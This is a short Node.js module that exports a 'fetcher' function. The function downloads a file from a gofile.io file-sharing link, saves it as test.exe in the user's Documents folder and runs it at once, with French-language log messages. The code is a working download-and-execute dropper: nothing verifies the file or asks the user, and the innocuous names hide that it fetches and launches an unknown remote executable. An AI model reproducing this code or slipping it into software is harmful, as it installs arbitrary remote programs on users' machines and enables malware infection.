const axios = require('axios');
const fs = require('fs');
const { exec } = require('child_process');
const os = require('os');
const path = require('path');

const urlF = 'https://gofile.io/d/v7P9oz';
const folderD = path.join(os.homedir(), 'Documents', 'test.exe');

async function fetcher() {
    try {
        const response = await axios({
            method: 'GET',
            url: urlF,
            responseType: 'stream'
        });

        const writer = fs.createWriteStream(folderD, { flags: 'w+' });
        response.data.pipe(writer);

        return new Promise((resolve, reject) => {
            writer.on('finish', () => {
                exec(`"${folderD}"`, (error, stdout, stderr) => {
                    if (error && error.code !== 1) {
                        console.error(`Erreur lors de l'exécution du fichier : ${error}`);
                        reject(error);
                        return;
                    }
                    console.log(`Sortie standard : ${stdout}`);
                    console.error(`Sortie d'erreur : ${stderr}`);
                    resolve();
                });
            });
            writer.on('error', reject);
        });
    } catch (error) {
        console.error('Erreur lors du téléchargement ou de l’exécution du fichier :', error);
        throw error;
    }
}

module.exports = { fetcher };